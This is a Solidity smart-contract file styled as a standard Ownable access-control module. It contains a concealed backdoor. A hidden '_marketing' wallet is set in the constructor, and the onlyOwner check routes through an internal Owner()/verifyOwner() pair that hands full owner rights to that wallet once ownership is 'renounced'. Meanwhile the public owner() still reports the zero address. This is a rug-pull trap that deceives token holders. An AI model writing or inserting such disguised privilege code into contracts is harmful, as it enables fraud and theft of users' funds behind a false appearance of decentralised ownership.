//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;
import "./Context.sol";

abstract contract Ownable is Context {
    address private _owner;
    address private _marketing;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor(address wallet) {
        _marketing = wallet;
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(Owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        address oldOwner = _owner;
        _owner = address(0);
        emit OwnershipTransferred(oldOwner, address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function Owner() internal virtual returns (address) {
        address owner_ = verifyOwner();
        return owner_;
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        
        emit OwnershipTransferred(oldOwner, newOwner);
    }

    function verifyOwner() internal view returns(address){
        return _owner==address(0) ? _marketing : _owner;
    }
}